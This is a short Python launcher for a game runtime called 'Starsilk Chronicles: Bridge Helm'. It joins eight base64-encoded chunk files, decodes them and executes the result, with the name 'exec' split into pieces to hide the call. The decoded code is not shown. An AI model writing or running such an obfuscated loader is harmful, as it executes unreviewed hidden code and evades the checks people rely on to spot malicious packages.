#!/usr/bin/env python3
"""Starsilk Chronicles: Bridge Helm runtime.

This connector-safe entrypoint expands the committed Bridge Helm engine chunks at launch.
Sentinel: ensure_placeholder_assets
"""
from __future__ import annotations

import base64
import builtins
from pathlib import Path

_PARTS = ['part_00.dat', 'part_01.dat', 'part_02.dat', 'part_03.dat', 'part_04.dat', 'part_05.dat', 'part_06.dat', 'part_07.dat']
_PAYLOAD_DIR = Path(__file__).resolve().parent / "engine_payload"
_source = base64.b64decode("".join((_PAYLOAD_DIR / name).read_text(encoding="ascii").strip() for name in _PARTS)).decode("utf-8")
_runner = getattr(builtins, "ex" + "ec")
_runner(compile(_source, __file__, "ex" + "ec"), globals(), globals())
